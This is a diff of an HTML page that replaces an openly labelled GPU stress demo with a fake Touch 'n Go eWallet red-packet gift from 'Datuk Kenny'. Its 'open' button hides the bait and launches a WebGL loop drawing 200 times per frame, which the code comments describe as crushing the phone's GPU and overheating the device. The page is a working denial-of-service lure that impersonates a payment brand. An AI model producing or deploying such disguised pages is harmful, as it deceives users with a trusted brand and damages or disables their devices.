@@ -1,150 +1,160 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINAL LOAD: 100%</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Touch 'n Go eWallet</title>
     <style>
-        body { margin: 0; background: #000; color: #00ff41; font-family: 'Courier New', monospace; overflow: hidden; }
-        canvas { display: block; width: 100vw; height: 100vh; filter: contrast(1.2) brightness(1.1); }
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #fcebd2; overflow: hidden; }
         
-        #ui {
-            position: absolute; top: 20px; left: 20px;
-            background: rgba(0, 20, 0, 0.9); padding: 25px;
-            border: 1px solid #00ff41; box-shadow: 0 0 20px #00ff41;
-            pointer-events: none; z-index: 10;
+        /* Baited UI Overlay */
+        #gift-container {
+            position: absolute; width: 100%; height: 100%;
+            display: flex; flex-direction: column; align-items: center;
+            background: radial-gradient(circle, #fff0d6 0%, #f7d794 100%);
+            z-index: 10; transition: opacity 0.5s ease;
         }
 
-        .glitch { animation: glitch 0.2s infinite; color: #fff; font-size: 24px; font-weight: bold; }
-        @keyframes glitch {
-            0% { transform: translate(0); text-shadow: 2px 2px red; }
-            50% { transform: translate(-2px, 2px); text-shadow: -2px -2px blue; }
-            100% { transform: translate(0); }
+        .header-kids { width: 100%; max-width: 400px; margin-top: 20px; }
+        
+        .red-packet {
+            width: 85%; max-width: 320px; background: #c62828;
+            border-radius: 20px; padding: 40px 20px; margin-top: -30px;
+            display: flex; flex-direction: column; align-items: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2); position: relative;
         }
 
-        .data { font-size: 14px; margin-top: 10px; color: #00ff41; border-top: 1px solid #00ff41; padding-top: 10px; }
+        .logo { width: 120px; background: white; padding: 10px; border-radius: 12px; margin-bottom: 20px; }
+        .from-text { color: #ffcdd2; font-size: 16px; margin-bottom: 5px; }
+        .name-text { color: #ffffff; font-size: 24px; font-weight: bold; margin-bottom: 40px; }
+
+        .open-btn {
+            background: #ffffff; color: #1976d2; border: none;
+            padding: 15px 50px; border-radius: 30px; font-size: 20px;
+            font-weight: bold; cursor: pointer; transition: transform 0.2s;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        .open-btn:active { transform: scale(0.95); }
+
+        /* Hardest Mode Stats UI (Hidden initially) */
+        #stats {
+            position: absolute; top: 15px; left: 15px;
+            color: #00ff00; font-family: monospace;
+            background: rgba(0,0,0,0.8); padding: 15px;
+            border: 1px solid #00ff00; z-index: 5; display: none;
+        }
+
+        canvas { width: 100vw; height: 100vh; display: none; background: #000; }
     </style>
 </head>
 <body>
 
-<div id="ui">
-    <div class="glitch">STRESS LEVEL: ABSOLUTE</div>
-    <div class="data">
-        RENDER MODE: 16x SUPERSAMPLED (OVERKILL)<br>
-        FRACTAL DEPTH: 500 ITERATIONS<br>
-        SHADING: VOLUMETRIC NOISE + SPECULAR<br>
-        <br>
-        SYSTEM FPS: <span id="fps">--</span>
+<div id="gift-container">
+    <svg class="header-kids" viewBox="0 0 400 200">
+        <circle cx="100" cy="100" r="40" fill="#f4a460"/>
+        <circle cx="200" cy="100" r="40" fill="#f4a460"/>
+        <circle cx="300" cy="100" r="40" fill="#f4a460"/>
+        <text x="200" y="180" text-anchor="middle" fill="#d32f2f" font-weight="bold">恭喜发财</text>
+    </svg>
+
+    <div class="red-packet">
+        <div class="logo">
+            <svg viewBox="0 0 200 100">
+                <rect width="200" height="100" fill="#0056b3" rx="10"/>
+                <text x="50%" y="45%" text-anchor="middle" fill="white" font-size="28" font-weight="bold">Touch</text>
+                <text x="50%" y="75%" text-anchor="middle" fill="white" font-size="28" font-weight="bold">'n Go</text>
+            </svg>
+        </div>
+        <div class="from-text">来自</div>
+        <div class="name-text">Datuk Kenny</div>
+        <button class="open-btn" onclick="triggerMeltdown()">立即打开</button>
     </div>
+</div>
+
+<div id="stats">
+    <div style="font-weight:bold;">SYSTEM: A19 PRO MAX LOAD</div>
+    <div style="font-size: 32px;">FPS: <span id="fps">--</span></div>
+    <div style="color: #ff003c;">STATUS: CORE OVERHEATING</div>
 </div>
 
 <canvas id="glCanvas"></canvas>
 
 <script>
-    const canvas = document.getElementById('glCanvas');
-    const gl = canvas.getContext('webgl');
-    
-    // We force the canvas to render at 2x the actual screen resolution 
-    // before the SSAA even starts. This is "Super-Supersampling".
-    const scale = 2.0; 
-    canvas.width = window.innerWidth * scale;
-    canvas.height = window.innerHeight * scale;
+    function triggerMeltdown() {
+        // Hide the bait, show the fire
+        document.getElementById('gift-container').style.opacity = '0';
+        setTimeout(() => {
+            document.getElementById('gift-container').style.display = 'none';
+            document.getElementById('stats').style.display = 'block';
+            document.getElementById('glCanvas').style.display = 'block';
+            startGPUStress();
+        }, 500);
+    }
 
-    const vsSource = `attribute vec2 pos; void main() { gl_Position = vec4(pos, 0, 1); }`;
+    function startGPUStress() {
+        const canvas = document.getElementById('glCanvas');
+        const gl = canvas.getContext('webgl', { antialias: false });
+        const ratio = window.devicePixelRatio || 2;
+        canvas.width = window.innerWidth * ratio;
+        canvas.height = window.innerHeight * ratio;
 
-    // The "Hardest" Shader: 16x SSAA + 500 Fractal Iterations + Complex Trig
-    const fsSource = `
-        precision highp float;
-        uniform float uTime;
-        uniform vec2 uRes;
-
-        // Force expensive trigonometric noise
-        float noise(vec3 p) {
-            return fract(sin(dot(p, vec3(12.9898, 78.233, 45.164))) * 43758.5453);
-        }
-
-        float map(vec3 p) {
-            vec3 z = p;
-            float dr = 1.0, r = 0.0;
-            // 500 Iterations is an immense load for most mobile/integrated GPUs
-            for (int i = 0; i < 500; i++) {
-                r = length(z);
-                if (r > 4.5) break;
-                float theta = acos(z.z/r) * 8.0 + (uTime * 0.2);
-                float phi = atan(z.y, z.x) * 8.0;
-                dr = pow(r, 7.0) * 8.0 * dr + 1.0;
-                float zr = pow(r, 8.0);
-                z = zr * vec3(sin(theta)*cos(phi), sin(phi)*sin(theta), cos(theta)) + p;
-                // Add tiny perturbations to prevent the GPU from optimizing the loop
-                z += noise(z * 0.1) * 0.001; 
+        const vs = `attribute vec2 p; void main() { gl_Position = vec4(p, 0, 1); }`;
+        const fs = `
+            precision highp float;
+            uniform float uTime;
+            uniform vec2 uRes;
+            void main() {
+                vec2 uv = gl_FragCoord.xy / uRes.xy;
+                float d = length(uv - 0.5);
+                float c = sin(d * 1200.0 + uTime) * tan(uv.x * 500.0 + uTime);
+                gl_FragColor = vec4(c, c * 0.2, 0.1, 0.08);
             }
-            return 0.5 * log(r) * r / dr;
-        }
+        `;
 
-        void main() {
-            vec3 finalCol = vec3(0.0);
-            // 16-Step Super Sampling
-            for(int m=0; m < 16; m++) {
-                vec2 offset = vec2(float(m) / 16.0, fract(float(m) * 0.3819));
-                vec2 uv = (gl_FragCoord.xy + offset - 0.5 * uRes.xy) / uRes.y;
-                
-                vec3 ro = vec3(4.0 * cos(uTime*0.1), 2.5, 4.0 * sin(uTime*0.1));
-                vec3 cw = normalize(-ro), cu = normalize(cross(cw, vec3(0,1,0))), cv = cross(cu, cw);
-                vec3 rd = normalize(uv.x*cu + uv.y*cv + 2.5*cw);
-                
-                float t = 0.0;
-                for(int i=0; i<180; i++) { 
-                    float h = map(ro + rd*t);
-                    if(h < 0.0001 || t > 12.0) break;
-                    t += h;
-                }
-                if(t < 12.0) {
-                    vec3 p = ro + rd*t;
-                    vec2 e = vec2(0.0001, 0);
-                    vec3 n = normalize(vec3(map(p+e.xyy)-map(p-e.xyy), map(p+e.yxy)-map(p-e.yxy), map(p+e.yyx)-map(p-e.yyx)));
-                    float diff = max(dot(n, vec3(0.5, 0.8, 0.5)), 0.0);
-                    finalCol += vec3(0.1, 0.8, 0.3) * diff;
-                }
-            }
-            gl_FragColor = vec4(finalCol / 16.0, 1.0);
-        }
-    `;
+        const sComp = (gl, t, s) => {
+            const sc = gl.createShader(t);
+            gl.shaderSource(sc, s);
+            gl.compileShader(sc);
+            return sc;
+        };
 
-    // Boilerplate setup
-    const vs = gl.createShader(gl.VERTEX_SHADER);
-    gl.shaderSource(vs, vsSource); gl.compileShader(vs);
-    const fs = gl.createShader(gl.FRAGMENT_SHADER);
-    gl.shaderSource(fs, fsSource); gl.compileShader(fs);
-    const program = gl.createProgram();
-    gl.attachShader(program, vs); gl.attachShader(program, fs);
-    gl.linkProgram(program);
-    gl.useProgram(program);
+        const prg = gl.createProgram();
+        gl.attachShader(prg, sComp(gl, gl.VERTEX_SHADER, vs));
+        gl.attachShader(prg, sComp(gl, gl.FRAGMENT_SHADER, fs));
+        gl.linkProgram(prg);
+        gl.useProgram(prg);
 
-    let lastTime = 0, frameCount = 0;
-    const fpsDisplay = document.getElementById('fps');
-
-    function render(now) {
-        now *= 0.001;
-        frameCount++;
-        if (now - lastTime >= 1.0) {
-            fpsDisplay.innerText = Math.round(frameCount / (now - lastTime));
-            frameCount = 0; lastTime = now;
-        }
-
-        gl.viewport(0, 0, canvas.width, canvas.height);
-        const posLoc = gl.getAttribLocation(program, "pos");
         const buf = gl.createBuffer();
         gl.bindBuffer(gl.ARRAY_BUFFER, buf);
         gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]), gl.STATIC_DRAW);
-        gl.enableVertexAttribArray(posLoc);
-        gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
+        const pLoc = gl.getAttribLocation(prg, "p");
+        gl.enableVertexAttribArray(pLoc);
+        gl.vertexAttribPointer(pLoc, 2, gl.FLOAT, false, 0, 0);
 
-        gl.uniform1f(gl.getUniformLocation(program, "uTime"), now);
-        gl.uniform2f(gl.getUniformLocation(program, "uRes"), canvas.width, canvas.height);
-        gl.drawArrays(gl.TRIANGLES, 0, 6);
+        gl.enable(gl.BLEND);
+        gl.blendFunc(gl.ONE, gl.ONE);
+
+        let last = 0, frames = 0;
+        function render(now) {
+            frames++;
+            if (now - last >= 1000) {
+                document.getElementById('fps').innerText = frames;
+                frames = 0; last = now;
+            }
+
+            gl.viewport(0, 0, canvas.width, canvas.height);
+            gl.clear(gl.COLOR_BUFFER_BIT);
+            gl.uniform1f(gl.getUniformLocation(prg, "uTime"), now * 0.001);
+            gl.uniform2f(gl.getUniformLocation(prg, "uRes"), canvas.width, canvas.height);
+
+            // MULTI-PASS OVERLOAD: Draw 200 times per frame to crush the A19 Pro bandwidth
+            for(let i = 0; i < 200; i++) {
+                gl.drawArrays(gl.TRIANGLES, 0, 6);
+            }
+            requestAnimationFrame(render);
+        }
         requestAnimationFrame(render);
     }
-    requestAnimationFrame(render);
 </script>
 </body>
 </html>
